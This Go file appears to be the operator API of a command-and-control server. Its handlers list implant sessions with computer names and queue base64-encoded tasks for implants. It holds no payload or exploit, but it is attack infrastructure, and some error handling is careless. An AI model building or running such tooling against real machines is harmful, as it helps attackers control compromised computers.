package main

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"net/http"
	"strconv"
	"time"

	"github.com/gorilla/mux"
)

type session struct {
	Sessionid    string
	Implanttype  string
	Computername string
}

func sessions(w http.ResponseWriter, r *http.Request) {

	cookie, _ := r.Cookie("session")
	time := time.Now().Unix()

	if checksession(db, cookie.Value, time) {

		sessarr := qSessions(db)
		e, err := json.Marshal(sessarr)
		if err != nil {

			fmt.Println("[!] Error Serializing Session Data: ", err)
			return

		}

		fmt.Fprintf(w, string(e))

	} else {

		fmt.Fprintf(w, "GTFO!")

	}

}

func tasks(w http.ResponseWriter, r *http.Request) {

	vars := mux.Vars(r)
	session := vars["sessionid"]

	cookie, _ := r.Cookie("session")
	time := time.Now().Unix()

	if checksession(db, cookie.Value, time) {

		tasks := qTasks(db, session)

		taskresp, err := json.Marshal(tasks)
		if err != nil {

			fmt.Println("[!] Could not properly serialize tasks")
			return

		}

		fmt.Fprintf(w, string(taskresp))

	} else {

		fmt.Fprintf(w, "Fuck off!")

	}

}

func task(w http.ResponseWriter, r *http.Request) {

	vars := mux.Vars(r)
	session := vars["sessionid"]
	task := vars["taskid"]

	i, err := strconv.Atoi(task)
	if err != nil {
		fmt.Println("[!] Unable to convert id to int")
	}

	cookie, _ := r.Cookie("session")
	time := time.Now().Unix()

	if checksession(db, cookie.Value, time) {

		response := qTask(db, session, i)
		fmt.Fprintf(w, response)

	} else {

		fmt.Fprintf(w, "Fuck off!")

	}

}

func queueTask(w http.ResponseWriter, r *http.Request) {

	vars := mux.Vars(r)
	session := vars["sessionid"]

	cookie, _ := r.Cookie("session")
	time := time.Now().Unix()

	if checksession(db, cookie.Value, time) {

		encodedData := r.FormValue("task")
		data, err := base64.StdEncoding.DecodeString(encodedData)
		if err != nil {

			fmt.Fprintf(w, "Unable to decode tasking data!")

		}

		var task Task
		json.Unmarshal([]byte(data), &task)
		if taskInserter(db, session, &task) {

			fmt.Fprintf(w, "Successfully added task to queue!")

		} else {

			fmt.Fprintf(w, "Unable to insert task into queue!")

		}

	} else {

		fmt.Fprintf(w, "Fuck off!")

	}

}
